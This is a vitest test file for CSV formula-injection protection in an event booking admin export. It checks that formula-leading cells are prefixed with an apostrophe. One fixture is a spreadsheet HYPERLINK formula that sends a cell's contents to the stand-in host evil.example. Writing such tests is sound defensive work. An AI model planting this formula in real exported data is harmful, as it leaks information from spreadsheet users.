import { describe, expect, test } from 'vitest';
import { neutralizeCsvCell, neutralizeCsvRows } from './csvSafety';
import { getExportDataByTab } from '../form/adminArea/services/exportService';
import type { BookingWithTimestamp, FormContent } from '../form/userArea/interface';
import type { ArtistBookingWithTimestamp, ArtistFormContent } from '../form/artistArea/interface';

const FORMULA = '=HYPERLINK("https://evil.example?d="&B2;"Klick")';

describe('CSV formula injection protection (S10)', () => {
  test.each(['=1+1', '+49 170 123', '-2+3', '@SUM(A1)', '\t=1', '\r=1'])(
    'prefixes cells starting with a formula character: %j',
    (value) => {
      expect(neutralizeCsvCell(value)).toBe(`'${value}`);
    }
  );

  test.each([['Erika'], [''], [42], [-12.5], [null], [true]])('leaves %j unchanged', (value) => {
    expect(neutralizeCsvCell(value)).toBe(value);
  });

  test('neutralizes every cell of every row', () => {
    expect(neutralizeCsvRows([{ name: FORMULA, price: -5 }])).toEqual([
      { name: `'${FORMULA}`, price: -5 },
    ]);
  });

  test('admin dashboard export neutralizes participant input', () => {
    const booking = {
      first_name: FORMULA,
      last_name: '@cmd',
      email: 'x@example.org',
      phone: '+49 170 123',
      ticket_id: 0,
      total_price: 40,
      is_paid: false,
      timestamp: '2026-11-18',
    } as unknown as BookingWithTimestamp;
    const formContent = { ticket_options: [] } as unknown as FormContent;
    const artistFormContent = { ticket_options: [] } as unknown as ArtistFormContent;

    const [row] = getExportDataByTab(
      'bookings',
      [booking],
      [] as ArtistBookingWithTimestamp[],
      formContent,
      artistFormContent
    );

    expect(row).toMatchObject({
      FirstName: `'${FORMULA}`,
      LastName: "'@cmd",
      Phone: "'+49 170 123",
      Price: 40,
    });
  });
});
